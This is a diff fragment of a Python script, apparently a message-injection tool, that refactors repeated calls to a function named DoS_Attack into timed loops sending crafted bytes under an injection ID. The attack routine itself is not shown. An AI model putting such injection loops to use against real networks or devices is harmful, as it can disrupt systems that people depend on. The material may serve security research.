@@ -110,43 +110,31 @@ if __name__ == "__main__":
                 print("Bye Bye")
                 break
             first_injection = True
-            time.sleep(0.03/k)
             if cnt_b % 4 == 0:       
                 using_bytes[5] = msg_dict[5][0][2]
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
+                for _ in range(5):
+                    time.sleep(0.03)
+                    DoS_Attack(injection_id, using_bytes)
+                    
             elif cnt_b % 4 == 1:
                 using_bytes[5] = msg_dict[5][0][0]
-                injected = False
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
+                for _ in range(3):
+                    time.sleep(0.03)
+                    DoS_Attack(injection_id, using_bytes)         
+
             elif cnt_b % 4 == 2:
                 using_bytes[5] = msg_dict[5][0][2]
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
+                for _ in range(4):
+                    time.sleep(0.03)
+                    DoS_Attack(injection_id, using_bytes)
+
             elif cnt_b % 4 == 3:
                 using_bytes[5] = msg_dict[5][0][0]
-                injected = False
-                DoS_Attack(injection_id, using_bytes)
-                time.sleep(0.03/k)
-                DoS_Attack(injection_id, using_bytes)
+                for _ in range(2):
+                    time.sleep(0.03)
+                    DoS_Attack(injection_id, using_bytes)
+            
             else:
                 print("Sum Tin Wong")
             print("Cycle ends #{0}".format(cnt_b))
-            time.sleep(0.5)
             cnt_b += 1
